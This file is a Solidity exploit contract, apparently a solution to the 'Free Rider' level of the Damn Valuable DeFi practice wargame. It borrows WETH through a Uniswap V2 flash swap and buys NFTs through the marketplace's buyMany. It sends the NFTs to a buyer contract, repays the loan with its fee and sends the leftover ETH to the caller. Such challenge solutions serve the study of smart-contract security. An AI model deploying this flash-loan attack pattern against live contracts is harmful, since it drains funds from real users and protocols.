// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";
import "./FreeRiderNFTMarketplace.sol";

contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {
    address payable private immutable WETH;
    address private immutable FACTORY;
    address private immutable TOKEN;
    address payable private immutable MARKETPLACE;
    address private immutable BUYER;
    address private immutable NFT;

    constructor(
        address _factory,
        address payable _wth,
        address _token,
        address payable _marketplace,
        address _buyer,
        address _nft
    ) payable {
        FACTORY = _factory;
        WETH = _wth;
        TOKEN = _token;
        MARKETPLACE = _marketplace;
        BUYER = _buyer;
        NFT = _nft;
    }

    function start(uint256[] calldata tokenIds, uint256 _amount) external {
        address pair = IUniswapV2Factory(FACTORY).getPair(TOKEN, WETH);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = TOKEN == token0 ? 0 : _amount;
        uint256 amount1Out = TOKEN == token1 ? 0 : _amount;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(tokenIds, _amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(FACTORY).getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (uint256[] memory tokenIds, uint256 amount) = abi.decode(
            _data,
            (uint256[], uint256)
        );

        WETH9(WETH).withdraw(amount);
        FreeRiderNFTMarketplace(MARKETPLACE).buyMany{value: amount}(tokenIds);

        for (uint256 i = 0; i < tokenIds.length; i++) {
            DamnValuableNFT(NFT).safeTransferFrom(
                address(this),
                BUYER,
                tokenIds[i]
            );
        }

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        WETH9(WETH).deposit{value: amountToRepay}();
        WETH9(WETH).transfer(pair, amountToRepay);
        payable(tx.origin).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
